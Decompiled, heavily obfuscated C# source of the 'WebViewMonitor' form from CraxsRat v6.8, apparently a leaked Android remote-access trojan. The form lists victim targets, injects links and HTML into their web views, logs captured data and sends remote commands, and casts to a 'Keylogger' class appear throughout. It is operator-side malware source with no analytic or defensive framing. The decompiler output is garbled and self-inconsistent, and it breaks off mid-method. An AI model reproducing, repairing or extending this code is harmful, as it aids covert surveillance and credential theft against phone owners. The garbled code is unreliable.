// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.WebViewMonitor
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class WebViewMonitor : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client ScreenClass;
    public Craxs_Rat.sockets.Client classClient;
    public string DownloadsFolder;
    public Size ScreenSize;
    public bool LIVE;
    public bool ScreenShotFoucs;
    public int Rnew;
    public string Title;
    private static readonly IntPtr HWND_TOPMOST;
    public static byte f0051D1;
    private const uint SWP_NOMOVE = 2;
    public static byte f0051D3;
    private bool @checked;
    private string[] sizearry;
    private bool Swaping;
    private bool isdown;
    private List<Point> Trakpoint;
    private bool isclick;
    public static byte f0051DA;
    public const int HT_CAPTION = 2;
    public bool recordit;
    private int tiks;
    private object iscontroled;
    private bool keepmeto;
    private IContainer components;
    public Craxs_Rat.sockets.Client Classclient;
    private IContainer components;

    internal virtual DrakeUITextBox TargetLink
    {
      get => ((information) this)._TargetLink;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.DrakeUITextBox1_MouseDown);
label_1:
        int num1 = -744019253;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUITextBox targetLink;
          switch ((num3 = (uint) (-1462995301 - --(-1623877607 * ~~2096814400 - -1830051148 - (num2 - ((~-1314992642 ^ -1062200088 * 1696567 ^ (-593188083 - 1198313824) * -1578947951) * -710423415 - ((--1832928939 + -1817306257 * -1549874323 ^ -1447999960 - -637401930 ^ -368283426 ^ -1843076269) + (1889179964 - --297481968 + -~-644515614)))) ^ (~152513766 ^ 692249959 - 560139849) + (936029693 - 1746414087) * -39224797))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              targetLink.MouseDown += mouseEventHandler;
              num1 = (int) num3 * -1808444061 ^ 715904859;
              continue;
            case 3:
              targetLink.MouseDown -= mouseEventHandler;
              num1 = (int) num3 * -1657368579 ^ 436704830;
              continue;
            case 4:
              int num4 = targetLink == null ? -1825378519 : (num4 = -1837640876);
              num1 = num4 ^ (int) num3 * 1299053073;
              continue;
            case 5:
              ((information) this)._TargetLink = value;
              num1 = -1365543204;
              continue;
            case 6:
              targetLink = ((information) this)._TargetLink;
              num1 = (int) num3 * 486311280 ^ -260995430;
              continue;
            case 7:
              targetLink = ((information) this)._TargetLink;
              int num5 = targetLink == null ? 2099152512 : (num5 = 1438584214);
              num1 = num5 ^ (int) num3 * 1508029415;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon openbtn
    {
      get => ((information) this)._openbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx);
        DrakeUIButtonIcon openbtn = ((information) this)._openbtn;
label_1:
        int num1 = -1048065811;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~~num1 - ((-1532481394 ^ -1398048427 - -21155638) + -917394246)) * -1341809809 * 874539123 - -878199395)) % 8U)
          {
            case 0:
              int num3 = openbtn == null ? 1879920870 : (num3 = 915778780);
              num1 = num3 ^ (int) num2 * -1294152294;
              continue;
            case 1:
              int num4 = openbtn == null ? 1518522652 : (num4 = 1576576848);
              num1 = num4 ^ (int) num2 * -236393313;
              continue;
            case 2:
              goto label_1;
            case 3:
              openbtn.Click -= eventHandler;
              num1 = (int) num2 * 1378387097 ^ 902636984;
              continue;
            case 4:
              openbtn.Click += eventHandler;
              num1 = (int) num2 * 1470431041 ^ 1575410250;
              continue;
            case 5:
              openbtn = ((information) this)._openbtn;
              num1 = (int) num2 * 744731702 ^ 884572622;
              continue;
            case 6:
              goto label_3;
            case 7:
              ((information) this)._openbtn = value;
              num1 = -1496725519;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIComboBox DrakeUIComboBox1
    {
      get => ((information) this)._DrakeUIComboBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUIComboBox1 = value;
      }
    }

    internal virtual Label Mytitle
    {
      get => ((information) this)._Mytitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Mytitle = value;
    }

    public virtual Label statustext
    {
      get => ((information) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._statustext = value;
    }

    internal virtual Panel Panel3
    {
      get => ((information) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel3 = value;
    }

    internal virtual DrakeUIScrollBar vsbar
    {
      get => ((information) this)._vsbar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Vsbar_ValueChanged);
label_1:
        int num1 = 678030405;
        DrakeUIScrollBar vsbar;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~--((num1 * 249764087 ^ 1165647203 - -1573353173) - -~-1349167005)) % 7U)
          {
            case 0:
              vsbar = ((information) this)._vsbar;
              int num3 = vsbar == null ? 800611174 : (num3 = 411177630);
              num1 = num3 ^ (int) num2 * -1732645426;
              continue;
            case 1:
              vsbar.ValueChanged -= eventHandler;
              num1 = (int) num2 * -925745251 ^ -1789326316;
              continue;
            case 2:
              vsbar = ((information) this)._vsbar;
              int num4 = vsbar == null ? -144563862 : (num4 = -494624941);
              num1 = num4 ^ (int) num2 * 672858831;
              continue;
            case 3:
              ((information) this)._vsbar = value;
              num1 = 92635834;
              continue;
            case 4:
              vsbar.ValueChanged += eventHandler;
              num1 = (int) num2 * -63839495 ^ 28143195;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUITabControl tabcontrols
    {
      get => ((information) this)._tabcontrols;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._tabcontrols = value;
    }

    internal virtual TabPage TabPage1
    {
      get => ((information) this)._TabPage1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._TabPage1 = value;
    }

    internal virtual TabPage TabPage2
    {
      get => ((information) this)._TabPage2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._TabPage2 = value;
    }

    internal virtual Label resulttext
    {
      get => ((information) this)._resulttext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._resulttext = value;
    }

    internal virtual Panel Panel4
    {
      get => ((information) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel4 = value;
    }

    internal virtual Label Label2
    {
      get => ((information) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Label2 = value;
    }

    internal virtual DrakeUIButtonIcon selecthtmlbtn
    {
      get => ((information) this)._selecthtmlbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys);
label_1:
        int num1 = -603669577;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon selecthtmlbtn;
          switch ((num3 = (uint) (856706975 + (1868728869 + 652199309 ^ 929211857 - 1042801613) - (~num2 - ~(-1869774298 - 372709842 - --1658486766) * -702141723) ^ ~(1080644185 * 1596472946))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              selecthtmlbtn.Click += eventHandler;
              num1 = (int) num3 * -306286615 ^ 474908713;
              continue;
            case 2:
              selecthtmlbtn = ((information) this)._selecthtmlbtn;
              int num4 = selecthtmlbtn == null ? 599408839 : (num4 = -101441019);
              num1 = num4 ^ (int) num3 * 1435567506;
              continue;
            case 3:
              selecthtmlbtn.Click -= eventHandler;
              num1 = (int) num3 * -627048989 ^ 1472641920;
              continue;
            case 4:
              selecthtmlbtn = ((information) this)._selecthtmlbtn;
              int num5 = selecthtmlbtn == null ? 2080333658 : (num5 = -1920550837);
              num1 = num5 ^ (int) num3 * -251183533;
              continue;
            case 5:
              ((information) this)._selecthtmlbtn = value;
              num1 = 264203238;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual BackgroundWorker BWloader
    {
      get => ((information) this)._BWloader;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BWloader_DoWork);
label_1:
        int num1 = 154281098;
        BackgroundWorker bwloader;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - (361134826 - (1928598007 - 1941980739 + (456028490 + 313536185) - (--1803796857 + (559187011 + 274443236))) - (~1027759687 * -1586758997 ^ -~-714788989 ^ 542067367 * -1899811495 - (-175643142 - -73685766 - (-855402577 - 1195298749)))) - (1166599795 + (681643621 ^ (-1758523272 ^ -1127668685) + (868804451 - 1761991292))))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              bwloader.DoWork -= workEventHandler;
              num1 = (int) num2 * 1242053197 ^ -1725437812;
              continue;
            case 2:
              bwloader = ((information) this)._BWloader;
              int num3 = bwloader == null ? -25888721 : (num3 = -939017252);
              num1 = num3 ^ (int) num2 * -444809566;
              continue;
            case 3:
              int num4 = bwloader == null ? 1486957467 : (num4 = 1483556212);
              num1 = num4 ^ (int) num2 * 813589614;
              continue;
            case 4:
              goto label_3;
            case 5:
              bwloader = ((information) this)._BWloader;
              num1 = (int) num2 * -1287444542 ^ 1646280830;
              continue;
            case 6:
              ((information) this)._BWloader = value;
              num1 = 405018189;
              continue;
            case 7:
              bwloader.DoWork += workEventHandler;
              num1 = (int) num2 * 1827365474 ^ 1332618341;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Timer timeloader
    {
      get => ((information) this)._timeloader;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timeloader_Tick);
        Timer timeloader = ((information) this)._timeloader;
label_1:
        int num1 = 1771981850;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 * 1218815885 - --897145223) ^ -159952004 * -200925159)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              timeloader.Tick -= eventHandler;
              num1 = (int) num2 * 913162855 ^ -1884411546;
              continue;
            case 2:
              int num3 = timeloader == null ? 2093263227 : (num3 = -787723461);
              num1 = num3 ^ (int) num2 * -1294564556;
              continue;
            case 3:
              ((information) this)._timeloader = value;
              timeloader = ((information) this)._timeloader;
              int num4;
              num1 = num4 = timeloader == null ? -1192657828 : (num4 = 256388284);
              continue;
            case 4:
              timeloader.Tick += eventHandler;
              num1 = (int) num2 * 1329072957 ^ 312347282;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((information) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel1 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((information) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel2 = value;
    }

    internal virtual DrakeUICheckBox SaveCheck
    {
      get => ((information) this)._SaveCheck;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._SaveCheck = value;
    }

    internal virtual PictureBox vewimage
    {
      get => ((information) this)._vewimage;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._vewimage = value;
    }

    internal virtual Panel Panel5
    {
      get => ((information) this)._Panel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel5 = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((information) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._clinameinfo = value;
    }

    internal virtual PictureBox ClientPic
    {
      get => ((information) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._ClientPic = value;
    }

    internal virtual Panel Panel7
    {
      get => ((information) this)._Panel7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel7 = value;
    }

    internal virtual Panel Panel6
    {
      get => ((information) this)._Panel6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel6 = value;
    }

    internal virtual TabPage TabPage3
    {
      get => ((information) this)._TabPage3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._TabPage3 = value;
    }

    internal virtual DrakeUITitlePanel linkspanel
    {
      get => ((information) this)._linkspanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._linkspanel = value;
    }

    internal virtual DrakeUITitlePanel datapanel
    {
      get => ((information) this)._datapanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._datapanel = value;
    }

    internal virtual Panel Panel8
    {
      get => ((information) this)._Panel8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel8 = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((information) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUIButtonIcon1 = value;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((information) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUIButtonIcon2 = value;
      }
    }

    internal virtual DrakeUITextBox DrakeUITextBox1
    {
      get => ((information) this)._DrakeUITextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUITextBox1 = value;
      }
    }

    internal virtual Label Label1
    {
      get => ((information) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Label1 = value;
    }

    internal virtual DrakeUITextBox DrakeUITextBox3
    {
      get => ((information) this)._DrakeUITextBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUITextBox3 = value;
      }
    }

    internal virtual DrakeUITextBox DrakeUITextBox2
    {
      get => ((information) this)._DrakeUITextBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUITextBox2 = value;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => ((information) this)._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUIButtonIcon4 = value;
      }
    }

    internal virtual DrakeUIComboBox Actionslistcombo
    {
      get => ((information) this)._Actionslistcombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._Actionslistcombo = value;
      }
    }

    internal virtual DrakeUIComboBox TargetsListcombo
    {
      get => ((information) this)._TargetsListcombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._TargetsListcombo = value;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => ((information) this)._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information) this)._DrakeUIButtonIcon3 = value;
      }
    }

    internal virtual DrakeUIButtonIcon commndbtn
    {
      get => ((information._Closure\u0024__) this)._commndbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon6_Click);
        DrakeUIButtonIcon commndbtn = ((information._Closure\u0024__) this)._commndbtn;
label_1:
        int num1 = -470482285;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-((~(--1068906903 * -1367204705 - (-1687423207 - ~842441099)) - (-(252508987 * (1257122007 - 1375869959) - ~(-1605399761 * -1839556061)) + ~((-399186875 ^ ~1373356498) * -1174093077) - num2)) * -2098393659) ^ -1116156522 ^ -180790453)) % 7U)
          {
            case 0:
              commndbtn.Click += eventHandler;
              num1 = (int) num3 * 1947066295 ^ 1713814298;
              continue;
            case 1:
              goto label_3;
            case 2:
              int num4 = commndbtn == null ? 181408997 : (num4 = 2046677026);
              num1 = num4 ^ (int) num3 * 2080670223;
              continue;
            case 3:
              ((information._Closure\u0024__) this)._commndbtn = value;
              commndbtn = ((information._Closure\u0024__) this)._commndbtn;
              num1 = -1530531645;
              continue;
            case 4:
              commndbtn.Click -= eventHandler;
              num1 = (int) num3 * -1943454284 ^ -658615227;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num5 = commndbtn == null ? 1767255005 : (num5 = 682940266);
              num1 = num5 ^ (int) num3 * 1869927846;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon refbtn
    {
      get => ((information._Closure\u0024__) this)._refbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon7_Click);
label_1:
        int num1 = -174019068;
        DrakeUIButtonIcon refbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(((num1 ^ (-(-1579430304 * 1383599529) ^ 29914102 * -182609159) - -~(507270733 - 941202487) ^ -2096517953 * (~478488624 + -1436081665) ^ 1056119536) * 1017510905 - -985711748) * -1992146137) - -1669001638)) % 7U)
          {
            case 0:
              refbtn = ((information._Closure\u0024__) this)._refbtn;
              int num3 = refbtn == null ? -1590021358 : (num3 = -373244645);
              num1 = num3 ^ (int) num2 * -753659309;
              continue;
            case 1:
              refbtn.Click -= eventHandler;
              num1 = (int) num2 * 1397964240 ^ 24966229;
              continue;
            case 2:
              ((information._Closure\u0024__) this)._refbtn = value;
              num1 = -189444585;
              continue;
            case 3:
              refbtn = ((information._Closure\u0024__) this)._refbtn;
              int num4 = refbtn == null ? -2019566736 : (num4 = -1228782870);
              num1 = num4 ^ (int) num2 * 1974426327;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              refbtn.Click += eventHandler;
              num1 = (int) num2 * 155341670 ^ -581930362;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIRichTextBox datalogtext
    {
      get => ((information._Closure\u0024__) this)._datalogtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((information._Closure\u0024__) this)._datalogtext = value;
      }
    }

    internal virtual DrakeUITextBox linktext
    {
      get => ((inp) this)._linktext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._linktext = value;
    }

    internal virtual Label Label3
    {
      get => ((inp) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._Label3 = value;
    }

    internal virtual DrakeUIComboBox comandcombo
    {
      get => ((inp) this)._comandcombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._comandcombo = value;
    }

    internal virtual DrakeUIComboBox namescombo
    {
      get => ((inp) this)._namescombo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Namescombo_SelectedIndexChanged);
        DrakeUIComboBox namescombo = ((inp) this)._namescombo;
label_1:
        int num1 = -1339112025;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(((-1621626829 ^ -842770057) * -401600595 - -num2 * 1419787123 * 1281249339) * -1192586689)) % 7U)
          {
            case 0:
              ((inp) this)._namescombo = value;
              namescombo = ((inp) this)._namescombo;
              num1 = -1226016767;
              continue;
            case 1:
              int num4 = namescombo == null ? 2032593184 : (num4 = -1494553106);
              num1 = num4 ^ (int) num3 * -1417220085;
              continue;
            case 2:
              goto label_1;
            case 3:
              namescombo.SelectedIndexChanged -= eventHandler;
              num1 = (int) num3 * 1242544028 ^ -958168003;
              continue;
            case 4:
              namescombo.SelectedIndexChanged += eventHandler;
              num1 = (int) num3 * 525420854 ^ -449930172;
              continue;
            case 5:
              int num5 = namescombo == null ? 1985343457 : (num5 = 128919267);
              num1 = num5 ^ (int) num3 * -1403979363;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUITextBox idtext
    {
      get => ((inp) this)._idtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._idtext = value;
    }

    internal virtual DrakeUITextBox nametext
    {
      get => ((inp) this)._nametext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._nametext = value;
    }

    internal virtual Panel Panel9
    {
      get => ((inp) this)._Panel9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((inp) this)._Panel9 = value;
    }

    internal virtual DrakeUIButtonIcon cpybtn
    {
      get => ((inp) this)._cpybtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon8_Click);
label_1:
        int num1 = 377560141;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon cpybtn;
          switch ((num3 = (uint) ((1238850781 * ~(1242888265 * -1379023388 + (351153976 - 986591119 - 885919674)) - num2 ^ -(-305463733 * -323103627 ^ -1592664787 - 546155428) - -1088488326 ^ -~-105869589 + ~~1032403254) * 525820391)) % 9U)
          {
            case 0:
              cpybtn.Click += eventHandler;
              num1 = (int) num3 * 2049092851 ^ 939582168;
              continue;
            case 1:
              int num4 = cpybtn == null ? 471502206 : (num4 = 640779992);
              num1 = num4 ^ (int) num3 * -2051966526;
              continue;
            case 2:
              cpybtn = ((inp) this)._cpybtn;
              num1 = (int) num3 * -996046215 ^ -2055263574;
              continue;
            case 3:
              ((inp) this)._cpybtn = value;
              num1 = -1352549276;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num5 = cpybtn == null ? -374807542 : (num5 = 953735298);
              num1 = num5 ^ (int) num3 * -942064021;
              continue;
            case 6:
              cpybtn = ((inp) this)._cpybtn;
              num1 = (int) num3 * -235073579 ^ 531431174;
              continue;
            case 7:
              cpybtn.Click -= eventHandler;
              num1 = (int) num3 * 891465237 ^ 440753298;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon savbtn
    {
      get => ((inp) this)._savbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon9_Click);
        DrakeUIButtonIcon savbtn = ((inp) this)._savbtn;
        if (savbtn == null)
          goto label_5;
label_1:
        int num1 = 1583052023;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(66851609 * (563692041 * (1433259983 - -1261050781) - (1270984461 - 1843541537) * -1481787571) - ~num2 + -283169965 * 508992399 + -644363147 * (81790090 - -961321442)) * 944271347)) % 6U)
          {
            case 0:
              savbtn = ((inp) this)._savbtn;
              int num4 = savbtn == null ? -1906230062 : (num4 = -1938562112);
              num1 = num4 ^ (int) num3 * 398303661;
              continue;
            case 1:
              savbtn.Click += eventHandler;
              num1 = (int) num3 * 1278702427 ^ -1337183993;
              continue;
            case 2:
              goto label_5;
            case 3:
              goto label_1;
            case 4:
              savbtn.Click -= eventHandler;
              num1 = (int) num3 * -1176797 ^ 660810503;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((inp) this)._savbtn = value;
        num1 = 1761169721;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon clrbtn
    {
      get => ((inp) this)._clrbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon5_Click);
label_1:
        int num1 = 978876571;
        DrakeUIButtonIcon clrbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * 1010311203 - -(-1882006804 - -253748856 ^ ~-475085051 ^ -1392387068)) * -436624747)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((inp) this)._clrbtn = value;
              clrbtn = ((inp) this)._clrbtn;
              num1 = 307092060;
              continue;
            case 2:
              int num3 = clrbtn == null ? -527822465 : (num3 = -508726016);
              num1 = num3 ^ (int) num2 * -194130581;
              continue;
            case 3:
              clrbtn.Click += eventHandler;
              num1 = (int) num2 * 1059768967 ^ -72603544;
              continue;
            case 4:
              clrbtn.Click -= eventHandler;
              num1 = (int) num2 * -650562964 ^ -1467351807;
              continue;
            case 5:
              goto label_3;
            case 6:
              int num4 = clrbtn == null ? 1092837795 : (num4 = 608009425);
              num1 = num4 ^ (int) num2 * 1740774505;
              continue;
            case 7:
              clrbtn = ((inp) this)._clrbtn;
              num1 = (int) num2 * 639070307 ^ 1830740973;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    private void DrakeUITextBox1_MouseDown(object sender, MouseEventArgs e)
    {
      if (!Conversions.ToBoolean(((Keylogger) this).firstclick))
        return;
label_1:
      int num1 = -1107694919;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((~~(num1 - ~(-70889785 * (1208421943 * 339020693) * -1096858427)) ^ -1636791508) - ~-158452380)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            ((Keylogger) this).firstclick = (object) false;
            this.TargetLink.Text = EXGuarder.\u003705F2C12;
            num1 = (int) num2 * 320214474 ^ 897501197;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    public WebViewMonitor()
    {
label_1:
      int num1 = -688692500;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(--num1 * -1479719781) ^ -381037859)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Load += new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry);
            num1 = (int) num2 * -408388286 ^ 1240690592;
            continue;
          case 2:
            goto label_1;
          case 3:
            ((Keylogger) this).firstclick = (object) true;
            ((Keylogger) this).MapData = new Dictionary<string, string>();
            ((Keylogger) this).y = 0;
            ((UpdatesScreen) this).InitializeComponent();
            num1 = (int) num2 * -1966515798 ^ 1551560556;
            continue;
          case 4:
            this.FormClosing += new FormClosingEventHandler(this.WebViewMonitor_FormClosing);
            ((Keylogger) this).Title = EXGuarder.\u0033621550B;
            num1 = (int) num2 * 100959947 ^ 794569543;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public void PostData(string datastring)
    {
      // ISSUE: variable of a compiler-generated type
      WebViewMonitor._Closure\u0024__217\u002D0 TargetObject = (WebViewMonitor._Closure\u0024__217\u002D0) new WebViewMonitor();
label_1:
      int num1 = -1720715624;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~--(num1 + ((~1381124551 + 29707798 ^ -2036179912) + ~(1547894612 + 316872618 + (-1316388633 ^ 1653611859)) ^ 385039648 + (2052222360 ^ -290732681 - 1043078069) + 1066902470) + (--1993224128 - (615220376 ^ -507059705) + -(-455220060 - 1047973899) - (2125998393 + 267582986 + (~-610322460 + ~-1208081377)))) ^ -1090512764)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            ((Keylogger) TargetObject).\u0024VB\u0024Local_datastring = datastring;
            num1 = (int) num2 * -1974157676 ^ 1237890279;
            continue;
          case 2:
            ((Keylogger) TargetObject).\u0024VB\u0024Me = this;
            num1 = (int) num2 * 2103261115 ^ 1969869210;
            continue;
          case 3:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
            num1 = (int) num2 * -1659813233 ^ 1120740699;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public void addlinks(string lnk)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      WebViewMonitor._Closure\u0024__218\u002D0 TargetObject = (WebViewMonitor._Closure\u0024__218\u002D0) new WebViewMonitor._Closure\u0024__217\u002D0();
label_1:
      int num1 = 707274871;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~526512919 - (~(1369264942 ^ 1345107861) - ~(num2 * 993724699 - ~-(1955966802 ^ --562908465))) - 1208006492)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            ((Keylogger) TargetObject).\u0024VB\u0024Me = this;
            ((Keylogger) TargetObject).\u0024VB\u0024Local_lnk = lnk;
            num1 = (int) num3 * -1973976424 ^ 403633018;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      // ISSUE: method pointer
      this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx(object sender, EventArgs e)
    {
      if (((Keylogger) this).Classclient == null)
        return;
label_1:
      int num1 = 1329058303;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str;
        string[] strArray;
        int num4;
        int num5;
